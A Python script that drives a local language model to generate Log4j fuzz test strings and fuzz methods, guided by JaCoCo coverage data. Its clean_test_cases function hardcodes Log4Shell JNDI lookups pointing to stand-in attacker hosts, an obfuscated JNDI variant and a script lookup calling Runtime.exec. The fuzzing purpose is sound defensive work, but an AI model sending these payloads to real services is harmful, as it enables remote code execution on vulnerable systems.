import os
import json
import time
import sys
import subprocess
import re

def install_required_packages():
    """Install required packages."""
    packages = ["llama-cpp-python[metal]"]
    for package in packages:
        try:
            print(f"Attempting to install {package} with Metal GPU support...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                package,
                "--no-cache-dir",
                "--force-reinstall"
            ])
            print(f"Successfully installed {package} with Metal support")
        except subprocess.CalledProcessError as e:
            print(f"Error installing {package}: {e}")
            print("Attempting to install standard version...")
            try:
                subprocess.check_call([
                    sys.executable, "-m", "pip", "install",
                    "llama-cpp-python",
                    "--prefer-binary"
                ])
                print("Installation successful with standard options")
            except subprocess.CalledProcessError as e2:
                print(f"Error during second installation attempt: {e2}")
                sys.exit(1)


def initialize_model():
    """Initialize the model for text generation with GPU acceleration."""
    try:
        from llama_cpp import Llama
    except ImportError:
        print("llama_cpp module not found. Installing required packages...")
        install_required_packages()
        # Try importing again
        from llama_cpp import Llama

    model_path = "model/qwen2.5-coder-7b-instruct-q4_k_m.gguf"

    if not os.path.exists(model_path):
        raise FileNotFoundError(f"Model file not found at {model_path}. Please run download_model.py first.")

    print(f"Loading model from {model_path} with GPU acceleration...")

    # On Mac, use n_gpu_layers to offload to Metal
    n_gpu_layers = -1  # Use all layers

    # Initialize the model with parameters for GPU acceleration
    llm = Llama(
        model_path=model_path,
        n_ctx=2048,          # Reduced context size for faster inference
        n_batch=512,         # Batch size for prompt processing
        n_threads=4,         # Number of CPU threads
        n_gpu_layers=n_gpu_layers  # Use GPU for all layers
    )

    print("Model loaded successfully with GPU acceleration")
    return llm



def generate_log4j_test_cases(llm, num_cases=25):
    """Generate test cases for log4j fuzzing."""
    prompt_template = """<|im_start|>system
You are an expert Java developer specializing in creating test cases for fuzzing the log4j library.
<|im_end|>
<|im_start|>user
Generate a Java string that would be a good test case for fuzzing log4j. This string will be used as input to the following fuzzer methods:

1. fuzzPatternLayout - Generate a pattern string that might trigger interesting behavior in log4j's PatternLayout
2. fuzzLogMessages - Generate a log message that might trigger interesting behavior
3. fuzzJsonLayout - Generate content that might cause issues in JsonLayout
4. fuzzMessagePattern - Generate a message pattern format string that might reveal bugs

Focus on creating strings that might trigger edge cases, like special characters, extremely long strings, format specifiers, JNDI lookups, or other potentially problematic inputs.

Return ONLY the test string without any explanation or code wrapping.
<|im_end|>
<|im_start|>assistant
"""

    test_cases = []

    for i in range(num_cases):
        print(f"Generating test case {i+1}/{num_cases}...")

        # Generate a test case with higher temperature for more diversity
        completion = llm.create_completion(
            prompt=prompt_template,
            max_tokens=512,      # Reduced for faster generation
            temperature=0.8,
            top_p=0.95,
            repeat_penalty=1.1,
            stop=["<|im_end|>"]
        )

        # Extract the generated text
        generated_text = completion["choices"][0]["text"].strip()
        test_cases.append(generated_text)

        # Print a preview
        preview = generated_text[:50] + "..." if len(generated_text) > 50 else generated_text
        print(f"Generated: {preview}")

    # Save test cases to file
    output_path = "generated_tests/log4j_test_cases.json"
    with open(output_path, 'w') as f:
        json.dump(test_cases, f, indent=2)

    print(f"Generated {len(test_cases)} test cases and saved to {output_path}")
    return test_cases



def generate_fuzz_method(llm, component, existing_methods, fuzzer_code):
    """Generate a fuzz test method for a specific Log4j component."""
    method_name = f"fuzz{component['name']}"

    # Check if we already have a method with this name
    if method_name in existing_methods:
        print(f"Method {method_name} already exists, generating alternative")
        method_name = f"fuzz{component['name']}Alternative"
        if method_name in existing_methods:
            return None  # Skip if alternative also exists

    prompt_template = f"""<|im_start|>system
You are an expert Java developer specializing in creating fuzz test methods for the Log4j library.
<|im_end|>
<|im_start|>user
Create a new fuzz test method named "fuzz{component['name']}" for Log4j's {component['name']} component. This component handles {component['description']}.

The method should:
1. Take a FuzzedDataProvider parameter named "data"
2. Create and manipulate {component['name']} objects with fuzzed inputs
3. Handle exceptions properly with recordCrash
4. Be thorough in testing potential security issues: {component['security_reason']}

Follow the same pattern as other fuzz methods in the existing Log4jFuzzer class. Here's the method signature:

```java
private static void fuzz{component['name']}(FuzzedDataProvider data) {{
    try {{
        // Your fuzz testing code here
        
    }} catch (Exception e) {{
        recordCrash("{component['name']} fuzzing", e);
    }}
}}
I need ONLY the complete implementation of this method, with no extra explanation.
<|im_end|>
<|im_start|>assistant
"""
        # Generate the method
    completion = llm.create_completion(
        prompt=prompt_template,
        max_tokens=1536,
        temperature=0.7,
        top_p=0.9,
        repeat_penalty=1.1,
        stop=["<|im_end|>"]
    )

    # Extract the generated code
    method_code = completion["choices"][0]["text"].strip()

    # Clean up the code
    method_code = clean_generated_code(method_code)

    return {
        "name": component['name'],
        "method_name": method_name,
        "method_code": method_code
    }


def generate_fuzz_methods(llm, num_methods=5):
    """Generate multiple fuzz test methods using the LLM."""
    methods = []

    # Get components to fuzz
    components = generate_log4j_components(llm)

    # Get existing fuzzer information
    existing_info = parse_existing_fuzzer()
    existing_methods = existing_info['method_names']

    # Generate methods for each component
    count = 0
    for component in components:
        if count >= num_methods:
            break

        print(f"Generating fuzz method for {component['name']}...")
        method = generate_fuzz_method(llm, component, existing_methods, existing_info['content'])

        if method:
            methods.append(method)
            count += 1
            # Brief pause to avoid overwhelming the model
            time.sleep(1)

    return methods

def generate_integration_code(llm, existing_info, new_methods):
    """Generate updated fuzzerTestOneInput method to include new fuzz methods."""
    max_case = existing_info['max_case_number']

    # Extract the current switch statement
    current_switch = re.search(r'switch\s*\(methodToRun\)\s*{(.*?)}', existing_info['content'], re.DOTALL)
    if not current_switch:
        print("Could not find switch statement in fuzzerTestOneInput method")
        return None

    current_switch_content = current_switch.group(1)

    # Create a list of new case statements
    new_cases = []
    for i, method in enumerate(new_methods, start=max_case + 1):
        method_name = method["method_name"]
        new_case = f"""
            case {i}:
                // New method: {method_name}
                {method_name}(data);
                break;"""
        new_cases.append(new_case)

    # Determine how to update the methodToRun calculation
    method_count = max_case + 1 + len(new_methods)
    method_selection_code = f"int methodToRun = data.remainingBytes() > 0 ? Math.abs(data.consumeInt()) % {method_count} : 0;"

    # Create updated switch statement
    updated_switch = f"switch (methodToRun) {{{current_switch_content}"

    for new_case in new_cases:
        updated_switch += new_case

    updated_switch += "\n        }"

    return {
        "method_selection_code": method_selection_code,
        "updated_switch": updated_switch
    }



def parse_jacoco_report(xml_path):
    """Parse JaCoCo XML report to identify low-coverage areas."""
    import xml.etree.ElementTree as ET

    # Parse the XML file
    tree = ET.parse(xml_path)
    root = tree.getroot()

    # Extract coverage data
    coverage_data = []

    # Process each package
    for package in root.findall('.//package'):
        package_name = package.get('name')

        # Process each class in the package
        for class_elem in package.findall('./class'):
            class_name = class_elem.get('name')

            # Get method coverage
            for method in class_elem.findall('./method'):
                method_name = method.get('name')

                # Get coverage counters
                counters = method.findall('./counter')

                # Extract line and branch coverage
                line_counter = next((c for c in counters if c.get('type') == 'LINE'), None)
                branch_counter = next((c for c in counters if c.get('type') == 'BRANCH'), None)

                if line_counter is not None:
                    covered = int(line_counter.get('covered', 0))
                    missed = int(line_counter.get('missed', 0))
                    total = covered + missed

                    if total > 0:
                        line_coverage = covered / total
                    else:
                        line_coverage = 0.0
                else:
                    line_coverage = 0.0

                if branch_counter is not None:
                    covered = int(branch_counter.get('covered', 0))
                    missed = int(branch_counter.get('missed', 0))
                    total = covered + missed

                    if total > 0:
                        branch_coverage = covered / total
                    else:
                        branch_coverage = 0.0
                else:
                    branch_coverage = 0.0

                # Calculate a combined score
                # Weight branch coverage more heavily as it's often more important
                coverage_score = 0.4 * line_coverage + 0.6 * branch_coverage

                # Add to our data
                coverage_data.append({
                    'package': package_name,
                    'class': class_name,
                    'method': method_name,
                    'line_coverage': line_coverage,
                    'branch_coverage': branch_coverage,
                    'coverage_score': coverage_score
                })

    # Sort by coverage score (ascending)
    coverage_data.sort(key=lambda x: x['coverage_score'])

    return coverage_data


def generate_targeted_fuzz_methods(llm, coverage_data, num_methods=5):
    """Generate targeted fuzz methods focusing on the least-covered areas."""

    # Get the least-covered methods
    least_covered = coverage_data[:min(20, len(coverage_data))]

    # Group by class for better targeting
    class_coverage = {}
    for item in least_covered:
        class_name = item['class']
        if class_name not in class_coverage:
            class_coverage[class_name] = []
        class_coverage[class_name].append(item)

    # Sort classes by average coverage
    class_avg_coverage = {}
    for class_name, methods in class_coverage.items():
        avg_score = sum(m['coverage_score'] for m in methods) / len(methods)
        class_avg_coverage[class_name] = avg_score

    sorted_classes = sorted(class_avg_coverage.items(), key=lambda x: x[1])

    # Get detailed info for the top N classes
    target_classes = []
    for class_name, score in sorted_classes[:num_methods]:
        # Get the full package name
        package_name = next(item['package'] for item in coverage_data if item['class'] == class_name)
        full_class_name = f"{package_name}.{class_name}"

        # Get uncovered methods
        methods = [m['method'] for m in class_coverage[class_name]]

        target_classes.append({
            'full_name': full_class_name,
            'name': class_name.split('/')[-1],  # Just the simple class name
            'uncovered_methods': methods,
            'coverage_score': score
        })

    # Generate fuzz methods for each target class
    methods = []
    for target in target_classes:
        prompt_template = f"""<|im_start|>system
You are an expert Java developer specializing in creating fuzz tests for the Log4j library.
<|im_end|>
<|im_start|>user
I need to create a targeted fuzz method for the Log4j class `{target['full_name']}`.

The JaCoCo coverage report shows this class has low coverage (score: {target['coverage_score']:.2f}).
Some methods with low coverage include: {', '.join(target['uncovered_methods'][:5])}.

Please create a fuzz method named "fuzzTargeted{target['name']}" that specifically exercises this class
and its low-coverage methods. The method should:

1. Take a FuzzedDataProvider parameter named "data"
2. Create and manipulate instances of {target['name']}
3. Call the uncovered methods with fuzzed inputs
4. Handle exceptions properly with recordCrash
5. Be thorough in testing edge cases

Here's the method signature:

```java
private static void fuzzTargeted{target['name']}(FuzzedDataProvider data) {{
    try {{
        // Your targeted fuzzing code here
        
    }} catch (Throwable t) {{
        recordCrash("{target['name']} targeted fuzzing", t);
    }}
}}
Generate ONLY the implementation of this method, with no additional explanation.
<|im_end|>
<|im_start|>assistant
"""
    print(f"Generating targeted fuzz method for {target['name']}...")

    # Generate the method
    completion = llm.create_completion(
        prompt=prompt_template,
        max_tokens=1536,
        temperature=0.7,
        top_p=0.9,
        repeat_penalty=1.1,
        stop=["<|im_end|>"]
    )

    # Extract the generated code
    method_code = completion["choices"][0]["text"].strip()

    # Clean up the code
    method_code = clean_generated_code(method_code)

    methods.append({
        "name": f"Targeted{target['name']}",
        "method_name": f"fuzzTargeted{target['name']}",
        "method_code": method_code,
        "target_class": target['full_name']
    })

    return methods



def generate_patch_script(existing_info, methods, integration_code, output_dir="generated_tests/fuzz_methods"):
    """Generate a patch script to automatically integrate new methods."""
    fuzzer_path = "../log4j-fuzz/src/main/java/org/example/Log4jFuzzer.java"

    patch_script = f"""#!/bin/bash
# Auto-generated script to patch Log4jFuzzer.java with new fuzz methods

FUZZER_PATH="{fuzzer_path}"
BACKUP_PATH="$FUZZER_PATH.bak"

# Create backup
cp "$FUZZER_PATH" "$BACKUP_PATH"
echo "Created backup at $BACKUP_PATH"

# Find the closing brace of the class to insert methods before
CLASS_END=$(grep -n "}}" "$FUZZER_PATH" | tail -1 | cut -d':' -f1)

# Insert new methods before the class end
head -n $((CLASS_END-1)) "$FUZZER_PATH" > "$FUZZER_PATH.new"
cat "{output_dir}/all_methods.java" >> "$FUZZER_PATH.new"
echo "}}" >> "$FUZZER_PATH.new"

# Update the method selection code
METHOD_SELECTION='{integration_code["method_selection_code"]}'
sed -i '' "s/int methodToRun = .*/$METHOD_SELECTION/" "$FUZZER_PATH.new"

# Update the switch statement
SWITCH_START=$(grep -n "switch" "$FUZZER_PATH" | grep "methodToRun" | head -1 | cut -d':' -f1)
SWITCH_END=$(grep -n "}}" "$FUZZER_PATH" | awk -v start=$SWITCH_START '$1 > start' | head -1 | cut -d':' -f1)

# Create a temporary file with the new switch statement
cat > /tmp/new_switch.txt << 'EOF'
{integration_code["updated_switch"]}
EOF

# Replace the old switch statement with the new one
sed -i '' "${{SWITCH_START}},$(($SWITCH_END))s/switch.*}}/$(<\/tmp\/new_switch.txt)/" "$FUZZER_PATH.new"

# Save the list of method names for summary reporting
echo "{','.join([m['method_name'] for m in methods])}" > "{output_dir}/method_names.txt"

# Move the new file into place
mv "$FUZZER_PATH.new" "$FUZZER_PATH"
echo "Updated $FUZZER_PATH with new fuzz methods"
echo "Added {len(methods)} new methods: {', '.join([m['method_name'] for m in methods])}"
"""

    script_path = f"{output_dir}/apply_patch.sh"
    with open(script_path, 'w') as f:
        f.write(patch_script)

    # Make the script executable
    os.chmod(script_path, 0o755)

    print(f"Generated patch script at {script_path}")
    print("Run this script to automatically add the new methods to Log4jFuzzer.java")


def generate_integration_code(llm, method_names):
    """Generate code to integrate the new fuzz methods into the main fuzzer method."""
    prompt = f"""<|im_start|>system
    You are an expert Java developer specializing in creating fuzz test methods for testing the log4j library.
    <|im_end|>
    <|im_start|>user
    I have added {len(method_names)} new fuzz test methods to my Log4jFuzzer class:
    {', '.join(['fuzz' + name for name in method_names])}
    Now I need to modify the main fuzzerTestOneInput method to include calls to these new methods.
    Here's the existing pattern:
    javapublic static void fuzzerTestOneInput(FuzzedDataProvider data) {{
        totalExecutions++;
        
        // Make sure test cases are loaded
        if (!loadedTestCases) {{
            loadTestCases();
        }}
    
        // Determine whether to use a predefined test case or raw data
        boolean usePredefined = !TEST_CASES.isEmpty() && 
                              data.remainingBytes() > 0 && 
                              data.consumeBoolean();
        
        String specialTestCase = null;
        if (usePredefined) {{
            int index = Math.abs(data.consumeInt()) % TEST_CASES.size();
            specialTestCase = TEST_CASES.get(index);
        }}
    
        try {{
            // Choose which test method to run
            int testMethod = data.remainingBytes() > 0 ? 
                    Math.abs(data.consumeInt()) % 4 : 0;
            
            switch (testMethod) {{
                case 0:
                    if (specialTestCase != null && specialTestCase.contains("%")) {{
                        fuzzPatternLayout(data, specialTestCase);
                    }} else {{
                        fuzzPatternLayout(data);
                    }}
                    break;
                case 1:
                    if (specialTestCase != null) {{
                        fuzzLogMessages(data, specialTestCase);
                    }} else {{
                        fuzzLogMessages(data);
                    }}
                    break;
                case 2:
                    if (specialTestCase != null && specialTestCase.contains("{{")) {{
                        fuzzJsonLayout(data, specialTestCase);
                    }} else {{
                        fuzzJsonLayout(data);
                    }}
                    break;
                case 3:
                    if (specialTestCase != null && specialTestCase.contains("{{")) {{
                        fuzzMessagePattern(data, specialTestCase);
                    }} else {{
                        fuzzMessagePattern(data);
                    }}
                    break;
            }}
    
            // Generate a report after a certain time
            if (totalExecutions % 1000 == 0 && System.currentTimeMillis() - startTime > 60000) {{
                generateReport();
            }}
        }} catch (Exception e) {{
            recordCrash("Main fuzzer method", e);
        }}
    }}
    Generate the updated version of this method that includes the new fuzz test methods in the switch statement.
    The new methods should be assigned case numbers starting from 4.
    Generate ONLY the updated method, with no additional explanation.
    <|im_end|>
    <|im_start|>assistant
    """
    # Generate the integration code
    completion = llm.create_completion(
        prompt=prompt,
        max_tokens=1536,
        temperature=0.7,
        top_p=0.9,
        repeat_penalty=1.1,
        stop=["<|im_end|>"]
    )

    # Extract the generated code
    integration_code = completion["choices"][0]["text"].strip()
    return integration_code

def clean_generated_code(code):
    """Clean generated code by removing unnecessary parts and fixing common issues."""
    # Remove code fence markers if present
    code = re.sub(r'```java\s*', '', code)
    code = re.sub(r'```\s*$', '', code)

    # Fix any malformed string literals (unclosed quotes, etc.)
    code = re.sub(r'("(?:[^"\\]|\\.)*$)', r'\1"', code)

    # Remove any imports that might have been generated
    code = re.sub(r'import .*?;\n', '', code)

    # Remove any class definitions that might have been generated
    code = re.sub(r'(?:public|private|protected)\s+(?:static\s+)?class\s+.*?{', '', code)

    # Fix common syntax issues
    code = code.replace('System.out.println', '// System.out.println')  # Comment out print statements

    return code

def save_results(methods, integration_code):
    """Save the generated methods and integration code to files."""
# Create output directory
    os.makedirs("generated_tests/fuzz_methods", exist_ok=True)

    # Save individual methods
    all_methods = ""
    for method in methods:
        method_name = method['name']
        method_code = clean_generated_code(method['method'])

        # Save to individual file
        with open(f"generated_tests/fuzz_methods/fuzz{method_name}.java", 'w') as f:
            f.write(method_code)

        all_methods += method_code + "\n\n"

    # Save all methods combined
    with open("generated_tests/fuzz_methods/all_methods.java", 'w') as f:
        f.write(all_methods)

    # Save integration code
    integration_code = clean_generated_code(integration_code)
    with open("generated_tests/fuzz_methods/fuzzerTestOneInput.java", 'w') as f:
        f.write(integration_code)

    print(f"Saved {len(methods)} fuzz methods and integration code to generated_tests/fuzz_methods/")

def parse_existing_fuzzer(fuzzer_path="../log4j-fuzz/src/main/java/org/example/Log4jFuzzer.java"):
    """Parse the existing Log4jFuzzer.java file to identify current fuzz methods."""
    try:
        with open(fuzzer_path, 'r') as f:
            content = f.read()

        # Extract all fuzz method names
        fuzz_methods = re.findall(r'private static void fuzz(\w+)\(FuzzedDataProvider data', content)

        # Extract switch cases from fuzzerTestOneInput method
        switch_content = re.search(r'switch\s*\(methodToRun\)\s*{(.*?)}', content, re.DOTALL)
        if switch_content:
            max_case = re.findall(r'case\s+(\d+):', switch_content.group(1))
            max_case_number = max(map(int, max_case)) if max_case else -1
        else:
            max_case_number = -1

        return {
            'method_names': fuzz_methods,
            'max_case_number': max_case_number,
            'content': content
        }
    except Exception as e:
        print(f"Error parsing Log4jFuzzer.java: {e}")
        return {
            'method_names': [],
            'max_case_number': -1,
            'content': ""
        }

def generate_log4j_components(llm):
    """Generate a list of Log4j components to target for fuzzing."""
    prompt_template = """<|im_start|>system
You are an expert Java developer specializing in the Log4j library and security testing.
<|im_end|>
<|im_start|>user
List 10 different Log4j components/classes that would be good candidates for focused fuzzing. For each component, provide:
1. The component name (e.g., "SocketAppender")
2. A short description of its functionality
3. Why it might be security-sensitive

Format your response as a JSON array of objects with properties: name, description, security_reason.
<|im_end|>
<|im_start|>assistant
"""

    # Generate component list
    completion = llm.create_completion(
        prompt=prompt_template,
        max_tokens=1024,
        temperature=0.7,
        top_p=0.9,
        repeat_penalty=1.1,
        stop=["<|im_end|>"]
    )

    # Extract the generated text
    response_text = completion["choices"][0]["text"].strip()

    # Extract the JSON from the response
    try:
        # Find JSON content between triple backticks if present
        json_match = re.search(r'```json\s*(.*?)\s*```', response_text, re.DOTALL)
        if json_match:
            components = json.loads(json_match.group(1))
        else:
            # Try to extract JSON directly
            components = json.loads(response_text)

        print(f"Generated list of {len(components)} Log4j components to target")
        return components
    except Exception as e:
        print(f"Error parsing component list: {e}")
        # Return a default list in case of failure
        return [
            {"name": "JndiLookup", "description": "JNDI lookup handling", "security_reason": "Vulnerable to Log4Shell"},
            {"name": "SocketAppender", "description": "Network logging", "security_reason": "Network exposure"},
            {"name": "JdbcAppender", "description": "Database logging", "security_reason": "SQL injection"},
            {"name": "RollingFileAppender", "description": "File management", "security_reason": "Path traversal"},
            {"name": "PropertySetter", "description": "Object property manipulation", "security_reason": "Reflection abuse"},
            {"name": "ScriptPatternSelector", "description": "Pattern selection using scripts", "security_reason": "Script injection"}
        ]



def clean_test_cases(input_filename="log4j_test_cases.json", output_filename="cleaned_test_cases.json"):
    """Clean up the generated test cases."""
    try:
        # Read the raw JSON file
        with open(f"generated_tests/{input_filename}", "r") as f:
            raw_test_cases = json.load(f)

        # List to hold cleaned test cases
        cleaned_test_cases = []

        # Process each test case
        for test_case in raw_test_cases:
            # Remove code block markers and explanation text
            test_case = re.sub(r'```[^\n]*\n', '', test_case)
            test_case = re.sub(r'```', '', test_case)
            test_case = re.sub(r'Here are some potential test cases.*?:\n\n', '', test_case, flags=re.DOTALL)
            test_case = re.sub(r'Please note that these test cases.*', '', test_case, flags=re.DOTALL)

            # Remove section headers like "1. fuzzPatternLayout:" and any explanatory text
            test_case = re.sub(r'\d+\.\s*fuzz[A-Za-z]+:.*?\n', '', test_case)

            # Split by newlines and add non-empty lines as separate test cases
            for line in test_case.strip().split('\n'):
                line = line.strip()
                if line:
                    # Replace escaped characters with actual characters
                    line = line.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r')
                    line = line.replace('\\x00', '\x00').replace('\\xFF', '\xFF')
                    line = line.replace('\\"', '"').replace('\\\\', '\\')

                    # Add test case if it looks interesting
                    if '${jndi:' in line or '%' in line or '${' in line or '{' in line and '}' in line:
                        cleaned_test_cases.append(line)
                    elif len(line) > 5:  # Avoid very short meaningless fragments
                        cleaned_test_cases.append(line)

        # Add some specific test cases that are known to be useful
        additional_test_cases = [
            "${jndi:ldap://malicious.example.com/payload}",
            "${jndi:rmi://attacker.com/object}",
            "%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n",
            "${${env:ENV_NAME:-j}ndi${::-:}ldap://malicious.com/}",
            "{\"message\": \"%m\", \"level\": \"%p\", \"nested\": {\"field1\": \"%d\", \"field2\": \"%t\"}}",
            "Format with {0} and {1} and {999}",
            "${ctx:userID} ${ctx:loginID}",
            "%notaformat %anothernonformat %%percent",
            "${script:javascript:java.lang.Runtime.getRuntime().exec('calc.exe')}"
        ]

        # Add the additional test cases and remove duplicates
        cleaned_test_cases.extend(additional_test_cases)
        cleaned_test_cases = list(set(cleaned_test_cases))

        # Save cleaned test cases
        with open(f"generated_tests/{output_filename}", "w") as f:
            json.dump(cleaned_test_cases, f, indent=2)

        print(f"Cleaned {len(raw_test_cases)} raw test cases into {len(cleaned_test_cases)} useful test cases")
        return cleaned_test_cases

    except Exception as e:
        print(f"Error cleaning test cases: {e}")
        return []

if __name__ == "__main__":
    try:
        # Create directory structure if needed
        os.makedirs("generated_tests", exist_ok=True)

        # Install packages with Metal support
        install_required_packages()

        # Initialize model with GPU acceleration
        llm = initialize_model()

        # Ask user what to generate
        generate_type = input("What would you like to generate? (1: Test Cases, 2: Fuzz Methods, 3: Both): ")

        if generate_type == "1" or generate_type == "3":
            # Generate test cases
            print("\n--- Generating Test Cases ---\n")
            num_cases = int(input("How many test cases would you like to generate? (default: 5): ") or "5")
            test_cases = generate_log4j_test_cases(llm, num_cases=num_cases)

            # Clean test cases
            print("\n--- Cleaning Test Cases ---\n")
            cleaned_test_cases = clean_test_cases()

        if generate_type == "2" or generate_type == "3":
            # Generate fuzz methods
            print("\n--- Generating Fuzz Methods ---\n")
            num_methods = int(input("How many fuzz methods would you like to generate? (default: 5): ") or "5")
            methods = generate_fuzz_methods(llm, num_methods=num_methods)

            # Extract method names
            method_names = [method['name'] for method in methods]

            # Generate integration code
            print("\n--- Generating Integration Code ---\n")
            integration_code = generate_integration_code(llm, method_names)

            # Save results
            save_results(methods, integration_code)

        print("\nNext steps:")
        if generate_type == "1" or generate_type == "3":
            print("1. Run integrate_tests.py to integrate test cases into the fuzzer")
        if generate_type == "2" or generate_type == "3":
            print("2. Copy the generated fuzz methods to your Log4jFuzzer.java file")
            print("3. Replace the fuzzerTestOneInput method with the generated version")
        print("4. Compile and run the fuzzer with the new methods and test cases")

    except Exception as e:
        print(f"Error: {e}")